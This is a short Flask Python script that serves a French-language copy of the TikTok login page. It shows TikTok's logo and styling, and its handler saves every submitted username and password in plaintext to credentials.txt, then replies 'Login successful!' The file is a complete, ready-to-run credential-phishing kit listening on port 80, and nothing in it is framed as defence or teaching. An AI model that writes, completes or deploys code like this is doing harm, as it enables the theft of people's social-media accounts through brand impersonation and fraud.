from flask import Flask, request, render_template_string

app = Flask(__name__)

# Votre code HTML ici
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion TikTok</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background: #f9f9f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background: #fff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }

        .login-container img {
            width: 100px;
            margin-bottom: 20px;
        }

        h2 {
            margin-bottom: 30px;
            font-weight: 500;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, #fe2c55, #ff5e62);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 500;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            opacity: 0.9;
        }

        .links {
            margin-top: 15px;
            font-size: 14px;
        }

        .links a {
            color: #fe2c55;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            display: flex;
            align-items: center;
            text-align: center;
            font-size: 12px;
            color: #999;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #ddd;
        }

        .divider:not(:empty)::before {
            margin-right: .5em;
        }

        .divider:not(:empty)::after {
            margin-left: .5em;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/fr/0/09/TikTok_logo.png" alt="TikTok Logo">
        <h2>Connexion</h2>
        <form action="/" method="post">
            <input type="text" name="username" placeholder="Numéro de téléphone, email ou nom d'utilisateur" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit">Se connecter</button>
        </form>

        <div class="links">
            <a href="#">Mot de passe oublié ?</a>
        </div>

        <div class="divider">ou</div>

        <div class="links">
            Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
        </div>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open('credentials.txt', 'a') as f:
            f.write(f'Username: {username}, Password: {password}\n')
        return 'Login successful!'
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
